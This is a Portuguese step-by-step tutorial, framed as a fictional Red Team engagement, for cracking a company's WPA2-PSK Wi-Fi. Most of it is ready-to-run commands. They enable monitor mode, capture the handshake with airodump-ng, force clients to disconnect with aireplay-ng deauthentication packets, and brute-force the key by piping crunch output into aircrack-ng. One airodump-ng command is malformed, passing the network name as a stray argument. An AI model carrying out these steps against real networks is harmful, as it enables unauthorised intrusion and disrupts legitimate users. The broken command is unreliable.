Operação de Red Team real, onde você utilizaria `aircrack-ng` para capturar pacotes e recuperar a handshake de uma rede Wi-Fi, e em seguida, usaria `crunch` para gerar uma lista de senhas que seria alimentada diretamente no `aircrack-ng` para tentar quebrar a senha da rede.

### Operação de Red Team: Exemplo Fictício

#### Cenário

Você é membro de uma equipe de Red Team contratada para testar a segurança de uma empresa. Uma das tarefas é avaliar a segurança da rede Wi-Fi da empresa, identificada como `Empresa_WIFI`. A rede utiliza WPA2-PSK (Pre-Shared Key) para autenticação.

#### Passo 1: Preparação do Ambiente

1. **Habilitar Modo Monitor na Interface de Rede**

```bash
sudo airmon-ng start wlan0
```
Este comando ativa o modo monitor na interface `wlan0`, permitindo que você capture pacotes sem estar conectado à rede.

2. **Capturar Pacotes da Rede Alvo**

```bash
sudo airodump-ng wlan0mon
```
Identifique o BSSID (endereço MAC) e o canal da rede `Empresa_WIFI`. Suponha que o BSSID seja `00:11:22:33:44:55` e o canal seja `6`.

3. **Focar na Rede Alvo e Capturar Handshake**

```bash
sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write captura Empresa_WIFI wlan0mon
```
Isso captura pacotes da rede `Empresa_WIFI` e salva em um arquivo chamado `captura`.

4. **Forçar a Reautenticação de Clientes (Opcional)**

Para capturar a handshake mais rapidamente, force a desautenticação de um cliente conectado:

```bash
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```
Substitua `AA:BB:CC:DD:EE:FF` pelo endereço MAC de um cliente conectado. Isso envia 10 pacotes de desautenticação, forçando o cliente a se reconectar, momento em que a handshake será capturada.

#### Passo 2: Quebrar a Senha Usando Aircrack-ng e Crunch

1. **Verificar se a Handshake foi Capturada**

Após a captura, verifique se a handshake foi capturada corretamente:

```bash
aircrack-ng captura-01.cap
```
Você deve ver uma mensagem indicando que a handshake foi encontrada.

2. **Gerar e Quebrar Senhas com Crunch e Aircrack-ng**

Use o `crunch` para gerar senhas e passe-as diretamente para o `aircrack-ng` usando pipes (`|`):

```bash
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b 00:11:22:33:44:55 captura-01.cap
```
Neste comando:
- `crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789` gera todas as combinações possíveis de senhas com 8 caracteres usando letras minúsculas e dígitos.
- O pipe `|` redireciona a saída de `crunch` diretamente para o `aircrack-ng`.
- `-w -` indica que `aircrack-ng` deve ler a lista de senhas da entrada padrão (stdin).
- `-b 00:11:22:33:44:55` especifica o BSSID da rede alvo.
- `captura-01.cap` é o arquivo de captura que contém a handshake.

### Resumo da Operação

1. **Preparação**: Habilitar modo monitor e capturar pacotes.
2. **Foco na Rede Alvo**: Usar `airodump-ng` para focar na rede alvo e capturar a handshake.
3. **Forçar Reautenticação (Opcional)**: Usar `aireplay-ng` para desautenticar clientes e capturar a handshake.
4. **Quebrar a Senha**: Usar `crunch` para gerar senhas e passar para `aircrack-ng` para tentar quebrar a senha WPA2-PSK.

Esta operação combina a captura de pacotes e a quebra de senha usando ferramentas especializadas de segurança, demonstrando um exemplo de como uma equipe de Red Team pode testar a segurança de uma rede Wi-Fi.
